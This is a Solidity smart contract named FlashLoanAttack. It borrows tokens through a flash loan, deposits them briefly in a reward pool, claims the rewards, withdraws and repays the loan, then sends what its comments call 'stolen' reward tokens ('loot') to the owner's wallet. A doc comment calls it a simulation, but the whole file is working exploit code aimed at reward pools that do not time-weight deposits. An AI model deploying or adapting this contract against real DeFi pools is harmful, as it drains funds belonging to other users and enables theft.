// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IFlashLoanProvider {
    function executeFlashLoan(uint256 amount) external;
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IRewardPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function claimReward() external;
    function rewardToken() external view returns (address);
    function stakeToken() external view returns (address);
}

/**
 * @title FlashLoanAttack
 * @dev Simulates a flash loan attack that exploits a vulnerable reward pool.
 */
contract FlashLoanAttack {
    address public owner;
    IFlashLoanProvider public loanProvider;
    IRewardPool public rewardPool;
    IERC20 public stakeToken;
    IERC20 public rewardToken;

    constructor(address _loanProvider, address _rewardPool) {
        owner = msg.sender;
        loanProvider = IFlashLoanProvider(_loanProvider);
        rewardPool = IRewardPool(_rewardPool);

        stakeToken = IERC20(rewardPool.stakeToken());
        rewardToken = IERC20(rewardPool.rewardToken());
    }

    /**
     * Initiates the flash loan attack.
     */
    function executeAttack(uint256 loanAmount) external {
        require(msg.sender == owner, "Only owner");
        loanProvider.executeFlashLoan(loanAmount);
    }

    /**
     * This function is called by the FlashLoanProvider during the flash loan.
     */
    function executeOnFlashLoan(uint256 amount, uint256 fee) external {
        require(msg.sender == address(loanProvider), "Unauthorized");

        // Approve the reward pool to use loaned tokens
        stakeToken.approve(address(rewardPool), amount);

        // Deposit temporarily
        rewardPool.deposit(amount);

        // Exploit reward distribution
        rewardPool.claimReward();

        // Withdraw the loaned amount
        rewardPool.withdraw(amount);

        // Repay the flash loan
        stakeToken.transfer(address(loanProvider), amount + fee);

        // Attacker keeps the reward tokens
    }

    /**
     * Withdraw stolen reward tokens to attacker wallet.
     */
    function withdrawLoot() external {
        require(msg.sender == owner, "Only owner");
        uint256 balance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner, balance);
    }
}
